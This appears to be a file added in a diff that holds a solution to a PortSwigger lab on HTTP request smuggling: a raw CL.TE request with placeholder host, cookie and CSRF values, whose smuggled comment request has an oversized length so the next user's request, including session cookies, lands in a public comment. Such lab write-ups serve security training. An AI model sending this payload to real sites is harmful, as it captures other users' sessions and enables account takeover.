@@ -1,0 +1,23 @@
+The HTTP request at the bottom of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
+
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Cookie: session=[COOKIE]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 355
+Transfer-Encoding: chunked
+Connection: close
+
+0
+
+POST /post/comment HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Cookie: session=[COOKIE]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 915
+Connection: close
+
+csrf=[TOKEN]&postId=3&name=tom&email=tom%40tom.com&website=https%3A%2F%2Ftom.com&comment=x
+
